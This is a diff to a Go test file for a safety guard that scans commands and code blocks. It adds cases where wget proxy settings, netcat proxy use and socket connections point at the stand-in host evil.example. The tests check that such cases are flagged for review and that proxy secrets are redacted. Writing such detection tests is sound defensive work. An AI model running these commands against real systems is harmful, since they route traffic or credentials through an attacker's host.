@@ -393,12 +393,21 @@ func TestGuardReviewsWgetExecutableConfiguration(t *testing.T) {
 	for _, command := range []string{
 		"wget -e use_proxy=yes https://api.github.com/data",
 		"wget -ehttps_proxy=http://evil.example https://api.github.com/data",
+		"wget -qe use_proxy=yes https://api.github.com/data",
+		"wget -qehttps_proxy=http://evil.example https://api.github.com/data",
 		"wget --execute https_proxy=http://evil.example https://api.github.com/data",
 		"wget --execute=https_proxy=http://evil.example https://api.github.com/data",
 	} {
 		report := guard.Scan(safety.Request{Command: command})
 		require.Equal(t, safety.DecisionNeedsHumanReview, report.Decision, command)
 		require.Equal(t, "network.config", report.RuleID, command)
+	}
+	for _, command := range []string{
+		"wget -Oevil.example https://api.github.com/data",
+		"wget -qOevil.example https://api.github.com/data",
+	} {
+		report := guard.Scan(safety.Request{Command: command})
+		require.Equal(t, safety.DecisionAllow, report.Decision, command)
 	}
 }
 
@@ -409,6 +418,10 @@ func TestGuardRecognizesGroupedAndObjectNetworkAliases(t *testing.T) {
 	for _, block := range []codeexecutor.CodeBlock{
 		{Language: "go", Code: "import (\n n \"net\"\n)\nn.Dial(\"tcp\", \"evil.example:443\")"},
 		{Language: "python", Code: "import socket\nsock = socket.socket()\nsock.connect((\"evil.example\", 443))"},
+		{Language: "python", Code: "import socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect((\"evil.example\", 443))"},
+		{Language: "python", Code: "import socket as net\nsock = net.socket(net.AF_INET, net.SOCK_STREAM)\nsock.connect((\"evil.example\", 443))"},
+		{Language: "python", Code: "import socket\nself.sock = socket.socket(socket.AF_INET)\nself.sock.connect((\"evil.example\", 443))"},
+		{Language: "python", Code: "import socket\nwith socket.socket(socket.AF_INET) as sock:\n sock.connect((\"evil.example\", 443))"},
 		{Language: "python", Code: "import socket\nsock = socket.socket()\nother = sock\nother.connect((\"evil.example\", 443))"},
 	} {
 		report := guard.Scan(safety.Request{CodeBlocks: []codeexecutor.CodeBlock{block}})
@@ -420,6 +433,7 @@ func TestGuardRecognizesGroupedAndObjectNetworkAliases(t *testing.T) {
 		{Language: "go", Code: "import (\n n \"net\"\n)\nn.Dial(\"tcp\", \"api.github.com:443\")"},
 		{Language: "python", Code: "import socket\nsock = socket.socket()\nsock.connect((\"api.github.com\", 443))"},
 		{Language: "python", Code: "note = 'sock = socket.socket()'\nsock.connect((\"evil.example\", 443))"},
+		{Language: "python", Code: "note = 'sock = socket.socket(socket.AF_INET)'\nsock.connect((\"evil.example\", 443))"},
 	} {
 		report := guard.Scan(safety.Request{CodeBlocks: []codeexecutor.CodeBlock{block}})
 		require.Equal(t, safety.DecisionAllow, report.Decision, block.Language)
@@ -434,6 +448,9 @@ func TestReportRedactsPathQualifiedNCProxyAuth(t *testing.T) {
 	}{
 		{"/usr/bin/nc -P absolute-proxy-secret -x evil.example:1080 api.github.com 443", "absolute-proxy-secret"},
 		{"./bin/nc -Prelative-proxy-secret -x evil.example:1080 api.github.com 443", "relative-proxy-secret"},
+		{"/usr/bin/nc -vP combined-separate-secret -x evil.example:1080 api.github.com 443", "combined-separate-secret"},
+		{"./bin/nc -vPcombined-attached-secret -x evil.example:1080 api.github.com 443", "combined-attached-secret"},
+		{"./bin/nc -vPtokenPassword -x evil.example:1080 api.github.com 443", "tokenPassword"},
 	} {
 		report := guard.Scan(safety.Request{Command: tc.command})
 		encoded, err := json.Marshal(report)
@@ -449,6 +466,8 @@ func TestGuardDetectsGoTestPackageParallelism(t *testing.T) {
 		"go test -p 100 ./...",
 		"go test -p100 ./...",
 		"go test -p=100 ./...",
+		"go test -parallel 100 ./...",
+		"go test -parallel=100 ./...",
 	} {
 		report := guard.Scan(safety.Request{Command: command})
 		require.Equal(t, safety.DecisionNeedsHumanReview, report.Decision, command)
@@ -456,7 +475,9 @@ func TestGuardDetectsGoTestPackageParallelism(t *testing.T) {
 	}
 	for _, command := range []string{
 		"go env -p 100",
+		"go env -parallel 100",
 		"go test ./pkg/-p",
+		"go test ./pkg/-parallel",
 	} {
 		report := guard.Scan(safety.Request{Command: command})
 		require.Equal(t, safety.DecisionAllow, report.Decision, command)
